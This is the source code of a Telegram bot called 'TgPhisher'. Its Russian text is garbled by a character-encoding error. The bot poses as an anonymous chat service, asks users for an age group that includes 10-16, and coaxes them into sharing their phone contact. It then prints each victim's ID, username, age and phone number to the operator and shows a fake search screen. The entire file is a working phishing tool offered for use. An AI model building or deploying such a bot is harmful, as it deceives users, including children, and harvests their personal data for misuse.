# By Luka
import telebot
import sys
from telebot import types
import telebot
import os
import requests
from telebot import types
import colorama
from colorama import init, Fore, Style, Back

init()

# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ü–≤–µ—Ç–æ–≤
red = Fore.RED
cyan = Fore.CYAN
blue = Fore.BLUE
green = Fore.GREEN

yellow = Fore.YELLOW
reset = Style.RESET_ALL
bold = Style.BRIGHT

os.system('cls' if os.name == 'nt' else 'clear')
print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
                    .:–ê–Ω–æ–Ω–∏–º–Ω—ã–π –ß–∞—Ç:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CYB3R_ST4LK3R
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')
def is_valid_token(token):

    try:
        bot = telebot.TeleBot(token)
        bot_info = bot.get_me()
        if bot_info:
            return True
    except telebot.apihelper.ApiException:
        return False

token = input(f"     {blue}–í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞ >> ")

if not is_valid_token(token):
    print("{reset}     –ù–µ–≤–µ—Ä–Ω—ã–π —Ç–æ–∫–µ–Ω! –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –∑–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞")
    sys.exit

else:
    def get_bot_username(token):
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url).json()
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –∑–∞–ø—Ä–æ—Å —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω –∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        if response.get("ok") and 'username' in response.get("result", {}):
            return response["result"]["username"]
        else:
            return None

    username = get_bot_username(token)
    if username:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f'''
{bold}{blue}
      ______      ____  __    _      __             
     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
        /____/                                   
{reset}           
                    .:–ê–Ω–æ–Ω–∏–º–Ω—ã–π —á–∞—Ç:.    
           {bold}{yellow}Telegram{reset}:{cyan} t.me/CYB3R_ST4LK3R
     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher

      ''')
        print(f"        –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω!{reset} - {red}–¥–ª—è –≤—ã—Ö–æ–¥–∞ [ctrl + c]{reset}\n        –Æ–∑–µ—Ä–Ω–µ–π–º –≤–∞—à–µ–≥–æ –±–æ—Ç–∞: {yellow}@{username}{reset}\n        –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞\n        –ö–æ–º–∞–Ω–¥—É {yellow}- /start{reset} –±–æ—Ç—É.")      
bot = telebot.TeleBot(token)
user_data = {}
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, f"<b>–ü—Ä–∏–≤–µ—Ç, {message.from_user.first_name}!</b> üçí –ó–¥–µ—Å—å —Ç—ã —Å–º–æ–∂–µ—à—å –ø–æ–æ–±—â–∞—Ç—å—Å—è –∏ —Ä–∞–∑–≤–ª–µ—á—å—Å—è —Å –∂–µ–ª–∞—é—â–∏–º–∏ —ç—Ç–æ–≥–æ –ª—é–¥—å–º–∏. –°–Ω–∞—á–∞–ª–∞ —É–∫–∞–∂–∏—Ç–µ –≤–∞—à –≤–æ–∑—Ä–∞—Å—Ç–Ω—É—é –≥—Ä—É–ø–ø—É, —á—Ç–æ–±—ã –Ω–∞—Ö–æ–¥–∏—Ç—å –ª—é–¥–µ–π –ø–æ –≤–∞—à–∏–º –ø–∞—Ä–∞–º–µ—Ç—Ä–∞–º.", parse_mode='HTML')
    markup = types.ReplyKeyboardMarkup(row_width=3, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('10-16')
    itembtn2 = types.KeyboardButton('16-18')
    itembtn3 = types.KeyboardButton('18+')
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ –≤–æ–∑—Ä–∞—Å—Ç–Ω—É—é –≥—Ä—É–ø–ø—É:", reply_markup=markup.add(itembtn1, itembtn2, itembtn3))

@bot.message_handler(func=lambda message: message.text in ['10-16', '16-18', '18+'])
def set_age(message):
    user_data[message.chat.id] = {'age': message.text}
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä', request_contact=True)
    bot.send_message(message.chat.id, "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:", reply_markup=markup.add(itembtn1))

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    markup = types.ReplyKeyboardRemove()
    if message.contact.user_id == message.from_user.id:
        print(f"\n        ID –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {message.from_user.id}\n"
              f"      –ù–∏–∫–ù–µ–π–º: @{message.from_user.username}\n"
              f"      –í–æ–∑—Ä–∞—Å—Ç–Ω–∞—è –≥—Ä—É–ø–ø–∞: {user_data[message.chat.id]['age']}\n"
              f"      –ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {message.contact.phone_number}\n\n")
        bot.send_message(message.chat.id, "<b>üçí –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∞!</b>\n–î–ª—è –ø–æ–∏—Å–∫–∞ –≤–æ—Å–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å - /search", reply_markup=markup, parse_mode="HTML")
    else:
        print(f"        ID –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {message.from_user.id}\n"
              f"      –ù–∏–∫–ù–µ–π–º: @{message.from_user.username}\n"
              f"      –ü–æ–ø—ã—Ç–∫–∞ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä —á—É–∂–∏–º –∫–æ–Ω—Ç–∞–∫—Ç–æ–º: {message.contact.phone_number}\n\n")
        bot.send_message(message.chat.id, "–í—ã –æ—Ç–ø—Ä–∞–≤–∏–ª–∏ –Ω–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞!", reply_markup=markup)

@bot.message_handler(commands=['search'])
def default_handler(message):
    bot.send_message(message.chat.id, f'''
<b>üîç –ò–¥–µ—Ç –æ–∂–∏–¥–∞–Ω–∏–µ –æ–Ω–ª–∞–π–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π...</b>


<i>üçí - –ë—É–¥—å—Ç–µ –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ª–∏—á–Ω—ã—Ö —Ñ–æ—Ç–æ/–≤–∏–¥–µ–æ –º–∞—Ç–µ—Ä–∏–∞–ª–æ–≤!

üí¨ - –°–æ–±–µ—Å–µ–¥–Ω–∏–∫ –º–æ–∂–µ—Ç –±—ã—Ç—å –Ω–µ—Å–æ–≤–µ—Ä—à–µ–Ω–Ω–æ –ª–µ—Ç–Ω–µ–≥–æ –≤–æ–∑—Ä–∞—Å—Ç–∞
        –ú—ã –Ω–µ –Ω–µ—Å–µ–º –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –≤–∞—à–∏ –¥–µ–π—Å—Ç–≤–∏—è.</i>
''', parse_mode="html")

try:
    bot.polling(none_stop=True)
except Exception as e:
    print(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}")